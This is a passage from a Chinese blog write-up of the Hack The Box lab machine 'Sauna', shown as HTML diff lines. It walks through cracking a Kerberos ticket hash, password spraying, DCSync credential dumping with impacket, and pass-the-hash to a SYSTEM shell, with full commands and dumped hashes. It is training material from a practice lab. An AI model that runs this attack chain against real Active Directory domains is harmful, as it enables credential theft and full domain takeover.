class="hljs-number">2942</span> MB (<span class="hljs-number">512</span> MB allocatable), <span class="hljs-number">4</span>MCU<br><br>Minimum password length supported by kernel: <span class="hljs-number">0</span><br>Maximum password length supported by kernel: <span class="hljs-number">256</span><br><br>Hashes: <span class="hljs-number">1</span> digests; <span class="hljs-number">1</span> unique digests, <span class="hljs-number">1</span> unique salts<br>Bitmaps: <span class="hljs-number">16</span> bits, <span class="hljs-number">65536</span> entries, <span class="hljs-number">0x0000ffff</span> mask, <span class="hljs-number">262144</span> bytes, <span class="hljs-number">5</span>/<span class="hljs-number">13</span> rotates<br>Rules: <span class="hljs-number">1</span><br><br>Optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to <span class="hljs-keyword">switch</span> to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature <span class="hljs-built_in">abort</span> trigger <span class="hljs-built_in">set</span> to <span class="hljs-number">90</span>c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: <span class="hljs-number">0</span> MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: <span class="hljs-number">14344385</span><br>* Bytes.....: <span class="hljs-number">139921507</span><br>* Keyspace..: <span class="hljs-number">14344385</span><br><br>$krb5tgs$<span class="hljs-number">23</span>$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$cf98868809279887e2ad034a9d23cd4a$<span class="hljs-number">85212b</span>1895397574cc5445dd617a63a0ff4746693d7718c141984a066830446ac0423b55e7074031db7984f0621a9eefe2c9ebfaac73c83bd9122f9b360e7a45e975453f9711b33c550185e94d18c4def816a5db45bb792f53d7c58e6b3fbf23c3072dc48bbcbb993195ce7fe0ca4825283e9c41c37e9bae8f961efa0b1d1ebd82403c017d0a67276094e475bc781ca8f088220c5b1e870cc72a1db25bc991fb2d241814008dff1d7e712b460c58eed1da4f82d58aa8bdecc99ce8456e2b7c67847c8a27437422ba2e2e433ace4f82b15f26c864a2537c54f97ac971973a1b59fe32dfbbd0438adcf437c733544be850e46fceea9e93f6d31c19ac8292cb78f24684d5581d02735f76663c4e335d92d1ea9aa8e9b47678d287561c49f38dc8fcd335b98782dec427e61acebed5b9d5ef674d980ca48b7da0f69fadcf50c34ebb999c5f1b8dddc4466adfb9f72b0ef986a7db20036cbff4c16a8658d2410bd6f351665a512feaa957edbce6ee70f8e6c2d6578e22ed5fb08d841c7d176ec0e0606ab807fd7e3335fc25c56a5601a951ca909fa6a4e2ec694b2900aabf87ab5ead17d6d830c2a0f38e79217e79db47e5862eee1e1c858c69ed7f49c1a2398b0df40baf22c844e609a59d1ec7faaffad2dabce0af00f7817628f7ce3e9f62bb3f5d5fe5a05be790a1b086c6988cedc8c79b43a77fc618a7c259c6458d2c790d587b2e4a80938c18fd4756d9f576c54ba97e5e95ff91eb0102ef48abc1bd1c7d13d5f2369619e27d613b9e2bfd2a70fa6fba2231b1b8987aaa35b465a5818be62d82ab4e6c3c7de24512b54e4390332c0354075e4f10b59f5ac905e4069a5004a67d731f5cf4214ae86ef0fa2967e144cd67e8e8370eb3cadf2a110fba65a725da0483c814f0ec2be895524038bf8bfb2fe53b22d7aa4599fd7d737ce4f079a0719ce8560db7e3b41d76e8eb7c854614248ee0ff893d47b8ef3f4d3f9a06e8c7673f3f6b55e047e4f15fda20c82e55916099d41a667622b91b62eb45527b377bc8ceabc806730a3f2e857b723b9080c0c1bd1662361e8b540a762eda10cadccc0db7c37cfc9845573afd30b13b9066c511f0263c051d211bec7e272ac7cf9790ca6e41b416df2db9bf55fcb37fbdfc1d8ea43b6445edae5b775dd95d9cfc3466e726830a0bf22e65e9d6c7348b70e1a2f0ea8d04c8f5587370900f0b2818fccda5892ea8bf8cd2efd5eaf382cff54cdc3b55ea0c68854c86d19e339b960d73cb7b512a8a6a10f5dbd2f0f07ac8bb12c7708fcce636ba26005b1ff50079f0c1774a71ae06f2dcb797f4410b3af65f401173ff0d1c96700fc00a2a3e2b35fb6012b961b051ef0cd23c8be6cc441bf54b635f3c9475e59ffd51c3fd17f8ea4c6b5ec5d671a8f3eea4:Thestrokes23<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: <span class="hljs-number">13100</span> (Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP)<br>Hash.Target......: $krb5tgs$<span class="hljs-number">23</span>$*HSmith$EGOTISTICAL-BANK.LOCAL$egotisti...f3eea4<br>Time.Started.....: Fri May <span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">17</span>:<span class="hljs-number">04</span> <span class="hljs-number">2024</span> (<span class="hljs-number">4</span> secs)<br>Time.Estimated...: Fri May <span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">17</span>:<span class="hljs-number">08</span> <span class="hljs-number">2024</span> (<span class="hljs-number">0</span> secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)<br>Speed.#<span class="hljs-number">1.</span>........:  <span class="hljs-number">2482.7</span> kH/s (<span class="hljs-number">0.34</span>ms) @ Accel:<span class="hljs-number">256</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">4</span><br>Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (total), <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (new)<br>Progress.........: <span class="hljs-number">10539008</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">73.47</span>%)<br>Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">10539008</span> (<span class="hljs-number">0.00</span>%)<br>Restore.Point....: <span class="hljs-number">10537984</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">73.46</span>%)<br>Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span><br>Candidate.Engine.: Device Generator<br>Candidates.#<span class="hljs-number">1.</span>...: Throy1 -&gt; Thelittlemermaid<br>Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">74</span>%<br><br>Cracking performance lower than expected?                 <br><br>* Append -O to the commandline.<br>  This lowers the maximum supported password/salt <span class="hljs-title function_">length</span> <span class="hljs-params">(usually down to <span class="hljs-number">32</span>)</span>.<br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Append -S to the commandline.<br>  This has a drastic speed impact but can be better <span class="hljs-keyword">for</span> specific attacks.<br>  Typical scenarios are a small wordlist but a large ruleset.<br><br>* Update your backend API runtime / driver the right way:<br>  https:<span class="hljs-comment">//hashcat.net/faq/wrongdriver</span><br><br>* Create more work items to make use of your parallelization power:<br>  https:<span class="hljs-comment">//hashcat.net/faq/morework</span><br><br>[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt; Started: Fri May <span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">17</span>:<span class="hljs-number">03</span> <span class="hljs-number">2024</span><br>Stopped: Fri May <span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">17</span>:<span class="hljs-number">10</span> <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure>
+
+<p>16、我去，密码复用？？？？这么简单的，我都没想到。。。。</p>
+<p>17、经枚举，这上面两个账号确实无法远程登录，那就只能继续枚举了，尝试使用bloodhound-python 这个工具</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ bloodhound-python -u HSmith -p <span class="hljs-string">&#x27;Thestrokes23&#x27;</span> -d EGOTISTICAL-BANK.LOCAL -ns <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> -c all --zip<br>INFO: Found AD domain: egotistical-bank.local<br>INFO: Getting TGT <span class="hljs-keyword">for</span> user<br>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection <span class="hljs-title function_">error</span> <span class="hljs-params">(SAUNA.EGOTISTICAL-BANK.LOCAL:<span class="hljs-number">88</span>)</span>] [Errno -2] Name or service not known<br>INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL<br>INFO: Found 1 domains<br>INFO: Found 1 domains in the forest<br>INFO: Found 1 computers<br>INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL<br>INFO: Found 7 users<br>INFO: Found 52 groups<br>INFO: Found 3 gpos<br>INFO: Found 1 ous<br>INFO: Found 19 containers<br>INFO: Found 0 trusts<br>INFO: Starting computer enumeration with 10 workers<br>INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL<br>INFO: Done in 00M 21S<br>INFO: Compressing output into 20240510175754_bloodhound.zip<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Sauna-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>18、从AD域的攻击导图上看，我们需要获取到下面这个svc_loanmgr这个账号密码才行，只能靠枚举了。我突然想起，在上面使用 winpeas 工具枚举时，发现了一个默认配置的账号密码，虽说呢个账号是不存在的，但是密码确实可以进行喷洒下，看看对不对。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> -u ./targetname.txt  -p <span class="hljs-string">&#x27;Moneymakestheworldgoround!&#x27;</span> --<span class="hljs-keyword">continue</span>-on-success<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span>    <span class="hljs-number">445</span>    SAUNA            [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span>    <span class="hljs-number">445</span>    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\HSmith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span>    <span class="hljs-number">445</span>    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span>    <span class="hljs-number">445</span>    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Administrator:Moneymakestheworldgoround! STATUS_LOGON_FAILURE<br></code></pre></td></tr></table></figure>
+
+<p>19、看来密码是对的，就是这个用户的密码，下面我们模拟了下密码搜集的方法，发现在配置表中存在一个默认密码，和上面winpeas搜集的密码一样。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; reg query HKLM /f password /t REG_SZ /s<br><br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>    DefaultPassword    REG_SZ    Moneymakestheworldgoround!<br></code></pre></td></tr></table></figure>
+
+<p>20、下面开始尝试利用这个，下面是bloodhund提示信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">您可以使用impacket的secretsdump.py示例脚本执行dcsync攻击以获取任意主体的密码哈希：<br><br>secretsdump.py <span class="hljs-string">&#x27;testlab.local&#x27;</span>/<span class="hljs-string">&#x27;Administrator&#x27;</span>:<span class="hljs-string">&#x27;Password&#x27;</span>@<span class="hljs-string">&#x27;DOMAINCONTROLLER&#x27;</span><br><br>您还可以执行更复杂的ExtraSids攻击来跳域信任。有关这方面的信息，请参阅harmj0y在参考选项卡中的博客文章。<br><br>impacket-secretsdump <span class="hljs-string">&#x27;svc_loanmgr:Moneymakestheworldgoround!@EGOTISTICAL-BANK.LOCAL&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>21、开始利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-secretsdump <span class="hljs-string">&#x27;svc_loanmgr:Moneymakestheworldgoround!@EGOTISTICAL-BANK.LOCAL&#x27;</span><br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[-] RemoteOperations failed: DCERPC Runtime Error: code: <span class="hljs-number">0x5</span> - rpc_s_access_denied <br>[*] Dumping Domain <span class="hljs-title function_">Credentials</span> <span class="hljs-params">(domain\uid:rid:lmhash:nthash)</span><br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::<br>EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::<br>EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::<br>EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::<br>SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a3be8e197cd4d7ff129ff402410621e2:::<br>[*] Kerberos keys grabbed<br>Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657<br>Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e<br>Administrator:des-cbc-md5:fb8f321c64cea87f<br>krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24<br>krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9<br>krbtgt:des-cbc-md5:c170d5dc3edfc1d9<br>EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324<br>EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9<br>EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7<br>EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2<br>EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b<br>EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b<br>EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba<br>EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c<br>EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2<br>SAUNA$:aes256-cts-hmac-sha1-96:cdbd363c7a964052edf726a47f4e27a55d56c691672d79a67e0a969a835ce08c<br>SAUNA$:aes128-cts-hmac-sha1-96:3f620f1b4ea0c8746c569712aa93dee1<br>SAUNA$:des-cbc-md5:4908f425546bb320<br>[*] Cleaning up...<br></code></pre></td></tr></table></figure>
+
+<p>22、信息还是挺多的，直接哈希传递，psexec 搞起</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-psexec Administrator@EGOTISTICAL-BANK.LOCAL -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">823452073</span>d75b9d1cf70ebdf86c7f98e<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Requesting shares on EGOTISTICAL-BANK.LOCAL.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file qpMishEp.exe<br>[*] Opening SVCManager on EGOTISTICAL-BANK.LOCAL.....<br>[*] Creating service oCjR on EGOTISTICAL-BANK.LOCAL.....<br>[*] Starting service oCjR.....<br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.973</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure>
+
+<p>23、读取下最终的flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Windows\system32&gt; cd C:/Users/Administrator/Desktop<br> <br>C:\Users\Administrator\Desktop&gt; dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">489</span>C-D8FC<br><br> Directory of C:\Users\Administrator\Desktop<br><br><span class="hljs-number">07</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          .<br><span class="hljs-number">07</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          ..<br><span class="hljs-number">05</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">07</span>:<span class="hljs-number">45</span> AM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">7</span>,<span class="hljs-number">677</span>,<span class="hljs-number">739</span>,<span class="hljs-number">008</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\Administrator\Desktop&gt; type root.txt<br><span class="hljs-number">6</span>d781428d5fa9d3d6be398fdbbcac36a<br><br>C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/229</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Sauna-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/10/Sauna-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/08/Return-htb-writeup/" title="Return-htb-writeup">
+                        <span class="hidden-mobile">Return-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
